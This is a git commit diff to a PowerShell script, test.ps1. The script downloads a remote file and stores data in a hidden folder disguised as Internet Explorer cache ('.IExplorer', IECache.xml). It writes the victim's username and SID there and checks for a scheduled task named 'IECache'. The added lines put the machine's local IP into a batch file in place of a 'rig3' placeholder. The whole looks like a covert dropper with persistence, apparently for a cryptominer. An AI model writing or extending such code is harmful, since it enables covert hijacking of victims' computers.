e3892d0a76d7dbfd6bcd65b685f2cf93b3af48b8
mysec000 <104643039+mysec000@users.noreply.github.com>
2022-05-09 20:50:07 +0530

    3

--- test.ps1
+++ test.ps1
@@ -14,6 +14,8 @@ Invoke-WebRequest -Uri $source -OutFile $destination
 (Get-Content C:\Users\Admin\.IExplorer\IECache.xml -Raw) -Replace 'uname', ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name  | Set-Content C:\Users\Admin\.IExplorer\IECache.xml
 (Get-Content C:\Users\Admin\.IExplorer\IECache.xml -Raw) -Replace 'sid', ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value  | Set-Content C:\Users\Admin\.IExplorer\IECache.xml
 
+$localIpAddress=((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
+(Get-Content C:\Users\Admin\.IExplorer\Readme.bat -Raw) -Replace 'rig3', ($localIpAddress)  | Set-Content C:\Users\Admin\.IExplorer\Readme.bat
 
 
 if ($(Get-ScheduledTask -TaskName "IECache" -ErrorAction SilentlyContinue).TaskName -eq "IECache") {
